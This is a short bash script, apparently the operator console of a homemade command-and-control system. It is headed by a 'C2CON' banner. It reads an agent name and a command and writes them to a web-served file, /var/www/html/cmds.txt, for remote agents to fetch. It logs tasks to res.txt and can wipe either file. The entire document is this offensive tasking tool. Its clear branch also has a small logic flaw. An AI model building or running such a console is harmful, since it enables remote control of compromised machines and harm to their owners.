
while true
do
echo """
  ______ ___     ______   ______   .__   __. 
 /      |__ \   /      | /  __  \  |  \ |  | 
|  ,----'  ) | |  ,----'|  |  |  | |   \|  | 
|  |      / /  |  |     |  |  |  | |  . \`  | 
|  \`----./ /_  |  \`----.|  \`--'  | |  |\   | 
 \______|____|  \______| \______/  |__| \__| 
 
                 Started from the bottom, we keep diggin
"""

echo "Action ?"
read action

if [ "$action" = "cmd" ]; then
echo "Agent ?"
read agent
echo "Ze Juice ?"
read cmd
echo "$agent:$cmd" >> /var/www/html/cmds.txt
echo "Task to $agent => $cmd" >> /var/www/html/res.txt
sleep 2
clear


elif [ "$action" = "clear" ]; then
echo "file?"
read file

if [ "$file" = "cmds" ]; then
echo "" > /var/www/html/cmds.txt
clear
fi

if [ "$file" = "res" ]; then
echo "" > /var/www/html/res.txt
clear
else
echo "Unknown file"
fi

else
echo "Unknown cmd"
fi
done
